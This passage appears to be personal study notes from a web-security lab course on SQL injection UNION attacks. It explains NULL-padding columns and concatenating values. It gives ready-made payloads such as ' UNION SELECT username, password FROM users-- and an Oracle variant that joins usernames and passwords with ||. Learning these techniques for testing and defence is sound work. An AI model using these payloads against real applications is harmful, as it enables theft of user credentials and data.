>>>.....2) Using a SQL injection UNION attack to retrieve interesting data

First determine the no.of columns using 2nd method,
then do the below query;

' UNION SELECT <col_name1>, <col_name2> FROM <table_name>--
' UNION SELECT username, password FROM users--

for eg:
SELECT * FROM customers
UNION
SELECT NULL, first_name, last_name, NULL, NULL
FROM customers;

Output: 
	It will give all the data from the injected query column


Note: You will not always find the target table with the exact number of columns you want to retrieve. The original query may return only 2 or 3 columns, while the target table may contain more columns. In such cases, use NULL as placeholders for the unused columns to match the number of columns in the original query.

' UNION SELECT <col_name1>, <col_name2>, NULL, NULL FROM <table_name>--





>>>....3) Retrieving multiple values within a single column

You can retrieve multiple values together within single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

Steps:
First determine no.of columns(2nd method),
then check which column is getting reflected into the response(2nd solution),
then in that column insert your query.

' UNION SELECT NULL,username || '~' || password FROM users-- 

where, 
	double-pipe sequence || which is a string concatenation operator on Oracle
	separated by the ~ character

